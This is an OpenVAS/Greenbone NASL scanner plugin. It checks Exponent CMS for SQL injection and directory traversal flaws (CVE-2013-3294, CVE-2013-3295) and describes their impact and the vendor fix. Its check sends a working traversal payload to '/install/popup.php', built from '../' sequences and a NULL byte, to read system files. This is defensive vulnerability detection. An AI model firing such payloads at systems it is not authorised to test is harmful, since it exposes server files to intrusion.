# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:exponentcms:exponent_cms";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803702");
  script_version("2025-04-15T05:54:49+0000");
  script_cve_id("CVE-2013-3294", "CVE-2013-3295");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2013-05-23 14:56:02 +0530 (Thu, 23 May 2013)");
  script_name("Exponent CMS Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_exponet_cms_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("ExponentCMS/installed");

  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2013/May/57");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/121643");
  script_xref(name:"URL", value:"https://www.htbridge.com/advisory/HTB23154");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/526609");
  script_xref(name:"URL", value:"http://forums.exponentcms.org/viewtopic.php?f=16&t=789");
  script_xref(name:"URL", value:"http://www.exponentcms.org/news/release-candidate-1-v2-2-0-set-loose");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary SQL
  commands or include arbitrary PHP files from the local system using directory
  traversal sequences with URL-encoded NULL byte, read arbitrary files or execute
  arbitrary PHP code on the target system.");

  script_tag(name:"affected", value:"Exponent CMS version 2.2.0 beta 3 and prior");

  script_tag(name:"insight", value:"Multiple flaws due to:

  - Insufficient filtration of 'src' and 'username' HTTP GET parameters passed
    to '/index.php' script. A remote unauthenticated attacker can execute
    arbitrary SQL commands in application's database.

  - Improper filtration of user-supplied input passed via the 'page' HTTP GET
    parameter to '/install/popup.php' script.");

  script_tag(name:"solution", value:"Update to Exponent CMS 2.2.0 Release Candidate 1 or later.");

  script_tag(name:"summary", value:"Exponent CMS is prone to multiple vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

files = traversal_files();

foreach file( keys( files ) ) {

  url = dir + "/install/popup.php?page=" + crap( data:"../", length:3*15 ) + files[file] + "%00";

  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
